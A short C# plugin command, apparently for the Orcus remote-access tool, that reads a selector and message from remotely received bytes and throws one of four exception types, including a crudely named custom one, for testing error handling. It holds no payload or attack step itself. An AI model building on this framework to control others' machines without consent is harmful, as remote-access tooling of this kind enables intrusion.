using System;
using System.Text;
using Orcus.Plugins;

public class ExceptionTestCommand : Command
{
    public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
    {
        string @string = Encoding.UTF8.GetString(parameter, 4, parameter.Length - 4);
        switch (BitConverter.ToInt32(parameter, 0))
        {
            case 0:
                throw new Exception(@string);
            case 1:
                throw new ArgumentException(@string);
            case 2:
                throw new InvalidOperationException(@string);
            case 3:
                throw new YoMamaIsntSuckingException(@string);
        }
    }

    protected override uint GetId()
    {
        return 1001u;
    }
}
